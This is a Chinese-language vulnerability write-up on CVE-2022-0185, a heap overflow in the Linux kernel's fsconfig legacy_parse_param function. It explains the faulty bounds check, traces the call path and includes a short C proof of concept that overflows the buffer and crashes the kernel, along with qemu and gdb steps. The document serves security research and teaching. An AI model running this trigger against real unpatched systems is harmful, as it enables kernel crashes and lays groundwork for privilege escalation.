# CVE-2022-0185 分析

[toc]

## 漏洞简介

漏洞编号: CVE-2022-0185

漏洞产品: linux kernel - fsconfig syscall

影响版本: linux kernel 5.1-rc1 ~ 

源码获取: `apt source linux-image-unsigned-5.13.0-25-generic`

 或 https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/

## 环境搭建

内核编译环境docker ：[chenaotian/kernelcompile](https://registry.hub.docker.com/r/chenaotian/kernelcompile) 

漏洞分析docker：[chenaotian/cve-2022-0185](https://registry.hub.docker.com/r/chenaotian/cve-2022-0185)

- 编译好的内核、内核源码 `/root/linux-5.13`
- 安装qemu、gdb、pwndbg、gdb-peda 等
- qemu启动组件 `/root/cve-2022-0185`
- 使用见下面漏洞复现

## 漏洞原理

漏洞发生的系统调用是`fsconfig` 中的 `FSCONFIG_SET_STRING` 操作选项，该系统调用用于对已经打开的文件系统上下文进行一些配置，**需要的前提条件是具备`CAP_SYS_ADMIN` cap权限**：

> `fsopen`的主要目的就是创建一个文件系统上下文，然后把它和一个文件描述符挂钩，返回文件描述符。`fsopen`后面就是`fsconfig`，从字面意思应该可以猜到，我们上面通过`fsopen`创建了一个文件系统上下文，下面的`fsconfig`可能就是用来配置文件系统上下文里的内容的。事实上`fsconfig`确实主要是做这个配置工作的，除了文件系统上下文，同时它还支持其它的工作。

首先漏洞出现在 `legacy_parse_param` 函数中：

linux-5.13\fs\fs_context.c : 502 : legacy_parse_param

```c
static int legacy_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
	struct legacy_fs_context *ctx = fc->fs_private;
	unsigned int size = ctx->data_size;
	size_t len = 0;

	··· ···
	··· ···

	switch (param->type) {
	case fs_value_is_string:
		len = 1 + param->size;
		fallthrough;
	··· ···
	}

	if (len > PAGE_SIZE - 2 - size) //此处边界检查有问题
		return invalf(fc, "VFS: Legacy: Cumulative options too large");
	if (strchr(param->key, ',') ||
	    (param->type == fs_value_is_string &&
	     memchr(param->string, ',', param->size)))
		return invalf(fc, "VFS: Legacy: Option '%s' contained comma",
			      param->key);
	if (!ctx->legacy_data) {
		ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL); //在第一次时会分配一页大小
		if (!ctx->legacy_data)
			return -ENOMEM;
	}

	ctx->legacy_data[size++] = ',';
	len = strlen(param->key);
	memcpy(ctx->legacy_data + size, param->key, len);
	size += len;
	if (param->type == fs_value_is_string) {
		ctx->legacy_data[size++] = '=';
		memcpy(ctx->legacy_data + size, param->string, param->size); //拷贝，可能越界
		size += param->size;
	}
	ctx->legacy_data[size] = '\0';
	ctx->data_size = size;
	ctx->param_type = LEGACY_FS_INDIVIDUAL_PARAMS;
	return 0;
}
```

关键在于后面的`memcpy`，会将我们传入的`param->string` 拷贝到`ctx->legacy_data` 之中。而判断是否拷贝越界就在前面的`(len > PAGE_SIZE - 2 - size)` 判断，这里判断是有问题的，判断类型是`size_t` 也就是`unsigned int`，如果`size > PAGE_SIZE - 2` 则会发生整数溢出反转，造成`len < PAGE_SIZE - 2 - size` ，进而判断通过，后面拷贝的时候`size` 是大于 `PAGE_SIZE - 2`的，造成拷贝越界。

用到的一些数据结构：

```c
struct fs_context {
	const struct fs_context_operations *ops;
	struct mutex		uapi_mutex;	/* Userspace access mutex */
	struct file_system_type	*fs_type;
	void			*fs_private;	/* The filesystem's context */
	void			*sget_key;
	struct dentry		*root;		/* The root and superblock */
	struct user_namespace	*user_ns;	/* The user namespace for this mount */
	struct net		*net_ns;	/* The network namespace for this mount */
	const struct cred	*cred;		/* The mounter's credentials */
	struct p_log		log;		/* Logging buffer */
	const char		*source;	/* The source name (eg. dev path) */
	void			*security;	/* Linux S&M options */
	void			*s_fs_info;	/* Proposed s_fs_info */
	unsigned int		sb_flags;	/* Proposed superblock flags (SB_*) */
	unsigned int		sb_flags_mask;	/* Superblock flags that were changed */
	unsigned int		s_iflags;	/* OR'd with sb->s_iflags */
	unsigned int		lsm_flags;	/* Information flags from the fs to the LSM */
	enum fs_context_purpose	purpose:8;
	enum fs_context_phase	phase:8;	/* The phase the context is in */
	bool			need_free:1;	/* Need to call ops->free() */
	bool			global:1;	/* Goes into &init_user_ns */
	bool			oldapi:1;	/* Coming from mount(2) */
};

struct legacy_fs_context {
	char			*legacy_data;	/* Data page for legacy filesystems */
	size_t			data_size;
	enum legacy_fs_param	param_type;
};

struct fs_parameter {
	const char		*key;		/* Parameter name */
	enum fs_value_type	type:8;		/* The type of value here */
	union {
		char		*string;
		void		*blob;
		struct filename	*name;
		struct file	*file;
	};
	size_t	size;
	int	dirfd;
};
```

下面分析一下函数调用栈，首先入口肯定是 `fsconfig` 系统调用：

linux-5.13\fs\fsopen.c : 314 : SYSCALL_DEFINE5(fsconfig,...

```c
SYSCALL_DEFINE5(fsconfig,
		int, fd,
		unsigned int, cmd,
		const char __user *, _key,
		const void __user *, _value,
		int, aux)
{
	struct fs_context *fc;
	struct fd f;
	int ret;
	int lookup_flags = 0;

	struct fs_parameter param = {
		.type	= fs_value_is_undefined,
	};

	··· ···
	f = fdget(fd);
	if (!f.file)
		return -EBADF;
	ret = -EINVAL;
	if (f.file->f_op != &fscontext_fops)
		goto out_f;

	fc = f.file->private_data; //设置fc
    
	··· ···
	switch (cmd) {
	··· ···
	case FSCONFIG_SET_STRING:
		param.type = fs_value_is_string;
        //初始化结构体中的联合体中的string成员为用户传入的字符串
		param.string = strndup_user(_value, 256); 
		if (IS_ERR(param.string)) {
			ret = PTR_ERR(param.string);
			goto out_key;
		}
		param.size = strlen(param.string);//设置size
		break;
	··· ···
    ··· ···
	}

	ret = mutex_lock_interruptible(&fc->uapi_mutex);
	if (ret == 0) {
		ret = vfs_fsconfig_locked(fc, cmd, &param);
		mutex_unlock(&fc->uapi_mutex);
	}

	··· ···
    ··· ···
}
```

在`fsconfig` 系统调用的入口中，先根据文件描述符`fd` 初始化文件系统上下文结构体`fc`，然后根据用户传入的参数设置`param` 结构体，该结构体变量就是后面在漏洞发生函数`legacy_parse_param` 中使用的`param`。接下来进入`vfs_fsconfig_locked`函数：

linux-5.13\fs\fsopen.c :  216 : vfs_fsconfig_locked

```c
static int vfs_fsconfig_locked(struct fs_context *fc, int cmd,
			       struct fs_parameter *param)
{
	struct super_block *sb;
	int ret;

	ret = finish_clean_context(fc);
	if (ret)
		return ret;
	switch (cmd) {
	··· ···
	default:
		if (fc->phase != FS_CONTEXT_CREATE_PARAMS &&
		    fc->phase != FS_CONTEXT_RECONF_PARAMS)
			return -EBUSY;

		return vfs_parse_fs_param(fc, param);
	}
	fc->phase = FS_CONTEXT_FAILED;
	return ret;
}
```

首先调用`finish_clean_context`函数，这里会调用`legacy_init_fs_context` 函数来注册回调函数表，该回调函数表中就包括漏洞所在函数`legacy_parse_param`。

linux-5.13\fs\fs_context.c

 ```c
 int finish_clean_context(struct fs_context *fc)
 {
     ··· ···
 		error = legacy_init_fs_context(fc);
 	··· ···
 }
 
 static int legacy_init_fs_context(struct fs_context *fc)
 {
 	fc->fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL);
 	if (!fc->fs_private)
 		return -ENOMEM;
 	fc->ops = &legacy_fs_context_ops; //注册回调函数表
 	return 0;
 }
 
 const struct fs_context_operations legacy_fs_context_ops = {
 	.free			= legacy_fs_context_free,
 	.dup			= legacy_fs_context_dup,
 	.parse_param		= legacy_parse_param, //漏洞函数
 	.parse_monolithic	= legacy_parse_monolithic,
 	.get_tree		= legacy_get_tree,
 	.reconfigure		= legacy_reconfigure,
 };
 ```

注册结束之后，进入`vfs_parse_fs_param` 函数处理参数，这里会调用刚注册的回调函数，也就是漏洞函数。

linux-5.13\fs\fs_context.c : 98 : vfs_parse_fs_param

```c
int vfs_parse_fs_param(struct fs_context *fc, struct fs_parameter *param)
{
	··· ···

	if (fc->ops->parse_param) {
		ret = fc->ops->parse_param(fc, param); //漏洞所在函数
		if (ret != -ENOPARAM)
			return ret;
	}

	··· ···
    ··· ···
}
EXPORT_SYMBOL(vfs_parse_fs_param);
```

总体预览如下

- SYSCALL_DEFINE5(fsconfig,... : 系统调用入口
  - vfs_fsconfig_locked
    - finish_clean_context
      - legacy_init_fs_context : 注册回调函数表
    - vfs_parse_fs_param
      - legacy_parse_param : 漏洞

## 漏洞复现POC

漏洞复现poc：

```c
#define _GNU_SOURCE
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(void)
{
        char* val = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
        int fd = 0;
        fd = fsopen("ext4", 0);
        if (fd < 0) {
                puts("Opening");
                exit(-1);
        }
        for (int i = 0; i < 5000; i++) {
                fsconfig(fd, FSCONFIG_SET_STRING, "\x00", val, 0);
        }
        return 0;
}
```

静态编译之后打包到文件系统里用qemu 启动内核

```shell
cd ~/cve-2022-0185
gcc poc.c --static
cp a.out rootfs/a.out
cd rootfs
find . | cpio -o --format=newc > ../rootfs.img
cd ../
./boot.sh
```

换另一个终端使用gdb 远程调试：

```shell
cd ~ 
gdb ./vmlinux
target remote :10086
directory /root/linux-5.13
b legacy_parse_param 
c
```

如果想要使用peda 而不是pwndbg 的话：

```shell
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

第一次调用的时候：

`legacy_data` 还没初始化：

<img src="img/image-20220218115424519.png" alt="image-20220218115424519" style="zoom:80%;" />

会在后面调用`kmalloc` 初始化，之后会将输入字符串拷贝到`legacy_data` 中。函数返回时已经将第一个字符串拷贝过去了，会在前面加上`',='` ，长度为0x69。

<img src="img/image-20220218115629610.png" alt="image-20220218115629610" style="zoom:80%;" />

由于我们是分多次调用fsconfig 来进行字符串拷贝。每次传入 0x67 个`'A'` ，加上`legacy_parse_param` 函数会在前面加上`',='` ，所以每次拷贝长度为0x69，拷贝39次之后`legacy_data` 的长度就会到达0xfff，拷贝39次之后，断住查看：

<img src="img/image-20220218120003864.png" alt="image-20220218120003864" style="zoom:80%;" />

发现目前`legacy_data` 的`data_size` 已达到 0xfff

<img src="img/image-20220218143242019.png" alt="image-20220218143242019" style="zoom:80%;" />

在`kmalloc` 申请的0x1000 大小内存空间也马上要达到极限。查看漏洞发生处：

<img src="img/image-20220218143643847.png" alt="image-20220218143643847" style="zoom:80%;" />

0x68 小于反转后的 0xffff....，校验通过，拷贝之后直接越界，覆盖了后面的内存内容：

<img src="img/image-20220218143840967.png" alt="image-20220218143840967" style="zoom:80%;" />

然后继续运行之后内核崩溃：

<img src="img/image-20220218144210566.png" alt="image-20220218144210566" style="zoom:67%;" />

## 漏洞利用EXP

验证性的exp，利用范围比较狭隘。暂时还没分析，以后有时间补上：[Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185)

## 参考

github：[Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185)

writeup：https://www.willsroot.io/2022/01/cve-2022-0185.html
